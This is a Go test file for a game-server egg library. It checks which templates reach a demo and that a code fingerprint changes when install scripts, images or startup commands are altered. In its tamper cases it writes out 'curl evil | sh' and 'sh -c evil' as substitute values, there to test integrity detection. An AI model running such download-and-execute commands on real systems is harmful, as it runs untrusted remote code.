package library

import (
	"testing"

	"github.com/xena-studios/raptor/internal/eggs"
)

// The demo's view of the library (codeFiles, no icons) has every egg All
// has but the internal ones, and the fingerprint of the egg as servers get
// it (ServerEgg, with the x-raptor block the Panel sends) is the
// fingerprint of the upstream file: the block changes nothing that runs.
func TestDemoEggs(t *testing.T) {
	all, err := All()
	if err != nil {
		t.Fatal(err)
	}
	got, err := DemoEggs()
	if err != nil {
		t.Fatal(err)
	}
	byID := map[string]DemoEgg{}
	for _, d := range got {
		byID[d.ID] = d
	}
	for _, e := range all {
		d, ok := byID[e.ID]
		if e.Internal {
			if ok {
				t.Errorf("%s is internal but offered to the demo", e.ID)
			}
			continue
		}
		if !ok {
			t.Errorf("%s is missing from the demo's library", e.ID)
			continue
		}
		raw, err := eggs.Parse(e.Egg)
		if err != nil {
			t.Fatal(err)
		}
		if fp := eggs.CodeFingerprint(raw); fp == "" || fp != d.Fingerprint {
			t.Errorf("%s: the server egg's fingerprint %s differs from the upstream file's %s", e.ID, d.Fingerprint, fp)
		}
	}
	if d := byID["minecraft/paper"]; !d.Fits {
		t.Errorf("paper should fit the demo: %s", d.Why)
	}
	fits := 0
	for _, d := range got {
		if d.Fits {
			fits++
		} else if d.Why == "" {
			t.Errorf("%s doesn't fit but says nothing", d.ID)
		}
	}
	if fits < 100 || fits == len(got) {
		t.Errorf("%d of %d eggs fit the demo; the rule looks wrong", fits, len(got))
	}
}

// What the fingerprint covers: a change to anything that runs changes it,
// and a change to a name or description doesn't.
func TestCodeFingerprint(t *testing.T) {
	base := `{"meta":{"version":"PTDL_v2"},"name":"A","description":"d","docker_images":{"J":"ghcr.io/x/java:21"},
"startup":"java -jar server.jar","config":{"files":"{}","startup":"{\"done\":\"Done\"}","logs":"{}","stop":"stop"},
"scripts":{"installation":{"script":"echo hi","container":"alpine","entrypoint":"ash"}},
"variables":[{"name":"V","env_variable":"V","default_value":"1","user_viewable":true,"user_editable":true,"rules":"required|string"}]}`
	fp := func(s string) string {
		e, err := eggs.Parse([]byte(s))
		if err != nil {
			t.Fatal(err)
		}
		return eggs.CodeFingerprint(e)
	}
	want := fp(base)
	same := []string{
		`"name":"B"`, `"description":"other"`, `"default_value":"2"`,
	}
	olds := []string{`"name":"A"`, `"description":"d"`, `"default_value":"1"`}
	for i, s := range same {
		if got := fp(replace(base, olds[i], s)); got != want {
			t.Errorf("changing %s changed the fingerprint", s)
		}
	}
	for old, changed := range map[string]string{
		`echo hi`:                      `curl evil | sh`,
		`"container":"alpine"`:         `"container":"evil"`,
		`ghcr.io/x/java:21`:            `evil/image`,
		`java -jar server.jar`:         `sh -c evil`,
		`required|string`:              `nullable|string`,
		`"stop":"stop"`:                `"stop":"^SIGKILL"`,
		`"entrypoint":"ash"`:           `"entrypoint":"bash"`,
		`"env_variable":"V"`:           `"env_variable":"W"`,
		`"files":"{}"`:                 `"files":"{\"a.txt\":{\"parser\":\"file\",\"find\":{\"x\":\"y\"}}}"`,
		`"meta":{"version":"PTDL_v2"}`: `"meta":{"version":"PTDL_v2"},"features":["eula"]`,
	} {
		if got := fp(replace(base, old, changed)); got == want {
			t.Errorf("changing %s to %s left the fingerprint as it was", old, changed)
		}
	}
}

func replace(s, old, repl string) string {
	for i := 0; i+len(old) <= len(s); i++ {
		if s[i:i+len(old)] == old {
			return s[:i] + repl + s[i+len(old):]
		}
	}
	panic("not found: " + old)
}
